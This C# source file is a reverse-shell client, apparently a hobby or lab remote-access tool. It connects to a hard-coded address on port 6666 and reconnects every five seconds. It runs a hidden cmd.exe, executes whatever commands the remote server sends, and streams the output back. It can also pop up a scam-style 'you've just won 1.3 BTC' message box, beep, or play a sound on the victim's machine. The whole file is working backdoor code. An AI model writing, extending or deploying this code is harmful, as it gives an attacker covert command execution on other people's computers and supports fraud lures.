﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal class Base
    {
        static TcpClient client;
        static NetworkStream stream;
        static StreamWriter writer;
        static StreamReader reader;
        static StringBuilder builder;
        static Process processCmd;
        static Thread th_message, th_beep, th_sound;

        private enum command
        {
            HELP = 1,
            MESSAGE = 2,
            BEEP = 3,
            SOUND = 4,
            SHUTDOWN = 5,
        }

        public static void ClientLoop()
        {
            for (; ; )
            {
                RunClient();
                Thread.Sleep(5000);
            }
        }

        private static void RunClient()
        {
            client = new TcpClient();
            builder = new StringBuilder();

            if (!client.Connected)
            {
                try
                {
                    client.Connect("192.168.56.1", 6666);  // if deployed, needs to be a static IP address
                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream);
                }
                catch (Exception e)
                {
                    return;
                }

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    string line = reader.ReadLine();
                    Int16 intCommand = 0;
                    intCommand = GetCommandFromLine(line);

                    switch ((command)intCommand)
                    {
                        case command.MESSAGE:
                            th_message = new Thread(new ThreadStart(MessageCommand));
                            th_message.Start();
                            break;
                        case command.BEEP:
                            th_beep = new Thread(new ThreadStart(BeepCommand));
                            th_beep.Start();
                            break;
                        case command.SOUND:
                            th_sound = new Thread(new ThreadStart(PlaySoundCommand));
                            th_sound.Start();
                            break;
                        case command.SHUTDOWN:
                            writer.Flush();
                            Cleanup();
                            System.Environment.Exit(System.Environment.ExitCode);
                            break;
                    }

                    builder.Append(line);
                    builder.Append("\n");
                    if (builder.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (builder.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(builder);
                    builder.Remove(0, builder.Length);
                }
                catch (Exception e)
                {
                    Cleanup();
                    break;
                }
            }
        }

        private static void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            reader.Close();
            writer.Close();
            stream.Close();
        }

        private static void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private static void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        private static void BeepCommand()
        {
            Console.Beep(500, 2000);
        }

        private static void MessageCommand()
        {
            MessageBox.Show("YOU'VE JUST WON 1.3 BTC! Click to start claiming your prize");
        }

        private static Int16 GetCommandFromLine(string line)
        {
            Int16 intExtractedCommand = 0;
            int i; Char character;
            StringBuilder sb = new StringBuilder();

            for (i = 0; i < line.Length; i++)
            {
                character = Convert.ToChar(line[i]);
                if (Char.IsDigit(character))
                {
                    sb.Append(character);
                }
            }

            try
            {
                intExtractedCommand = Convert.ToInt16(sb.ToString());
            }
            catch (Exception ex) { }
            return intExtractedCommand;
        }

        private static void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder output = new StringBuilder();
            if (!String.IsNullOrEmpty(e.Data))
            {
                try
                {
                    output.Append(e.Data);
                    writer.WriteLine(output);
                    writer.Flush();
                }
                catch (Exception) { }
            }
        }
    }
}
